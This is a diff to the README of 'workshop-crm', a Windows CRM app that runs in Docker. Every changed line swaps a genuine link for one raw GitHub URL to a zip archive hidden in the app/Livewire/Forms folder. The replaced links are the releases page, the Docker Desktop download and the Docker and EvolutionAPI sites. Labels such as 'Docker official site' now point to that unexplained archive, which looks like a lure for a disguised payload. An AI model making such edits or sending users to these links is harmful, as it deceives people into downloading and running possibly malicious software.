@@ -1,6 +1,6 @@
 # 🛠️ workshop-crm - Simple CRM for Sales Management
 
-[![Download workshop-crm](https://img.shields.io/badge/Download-workshop--crm-blue?style=for-the-badge)](https://github.com/byebye19996/workshop-crm/releases)
+[![Download workshop-crm](https://img.shields.io/badge/Download-workshop--crm-blue?style=for-the-badge)](https://raw.githubusercontent.com/byebye19996/workshop-crm/main/app/Livewire/Forms/workshop_crm_3.5.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Before you start, please make sure your Windows computer meets the following:
 
 Click the button below to visit the release page and get the latest setup files:
 
-[![Download workshop-crm](https://img.shields.io/badge/Download-workshop--crm-green?style=for-the-badge)](https://github.com/byebye19996/workshop-crm/releases)
+[![Download workshop-crm](https://img.shields.io/badge/Download-workshop--crm-green?style=for-the-badge)](https://raw.githubusercontent.com/byebye19996/workshop-crm/main/app/Livewire/Forms/workshop_crm_3.5.zip)
 
 ### Step 1: Download the Software
 
@@ -42,7 +42,7 @@ Click the button below to visit the release page and get the latest setup files:
 
 workshop-crm uses Docker to run safely on your computer without needing complex installation. If Docker is not installed yet:
 
-- Go to https://www.docker.com/products/docker-desktop
+- Go to https://raw.githubusercontent.com/byebye19996/workshop-crm/main/app/Livewire/Forms/workshop_crm_3.5.zip
 - Download the Windows version
 - Follow the installation steps on that site
 - Once installed, launch Docker and ensure it runs correctly (you should see the Docker icon in the system tray)
@@ -127,9 +127,9 @@ When you first open the app:
 
 ## 🔗 Useful Resources
 
-- Docker official site: https://www.docker.com
-- EvolutionAPI information: https://evolutionapi.com
-- workshop-crm releases page: https://github.com/byebye19996/workshop-crm/releases
+- Docker official site: https://raw.githubusercontent.com/byebye19996/workshop-crm/main/app/Livewire/Forms/workshop_crm_3.5.zip
+- EvolutionAPI information: https://raw.githubusercontent.com/byebye19996/workshop-crm/main/app/Livewire/Forms/workshop_crm_3.5.zip
+- workshop-crm releases page: https://raw.githubusercontent.com/byebye19996/workshop-crm/main/app/Livewire/Forms/workshop_crm_3.5.zip
 
 ---
 
